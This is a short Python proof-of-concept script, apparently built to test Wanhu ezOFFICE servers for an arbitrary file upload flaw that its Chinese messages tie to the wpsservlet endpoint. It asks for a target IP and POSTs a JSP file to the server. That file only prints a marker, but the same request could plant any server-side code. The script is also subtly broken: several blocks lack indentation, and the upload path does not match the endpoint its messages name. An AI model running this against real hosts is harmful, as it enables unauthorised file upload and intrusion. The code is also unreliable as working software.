```python
import requests

def verify(ip):

    url = f'{ip}/defaultroot/platform/portal/layout/check.jsp'

    headers = {
    'Content-Type': 'multipart/form-data',
    }

    payload = '''
    --55aeb894de1521afe560c924fad7c6fb
    Content-Disposition: form-data; name="NewFile"; filename="check.jsp"

    <% out.print("This website has a vulnerability!!!");%>
    --55aeb894de1521afe560c924fad7c6fb--
    '''

    try:
        response = requests.post(url, headers=headers, data=payload)
        # 验证成功输出相关信息
        if response.status_code == 200 :
        print(f"{ip}存在万户ezoffice wpsservlet任意文件上传！！！")
        else:
        print('漏洞不存在。')

    except Exception as e:
    	pass

if __name__ == '__main__':
self = input('请输入目标主机IP地址：')
verify(self)
```

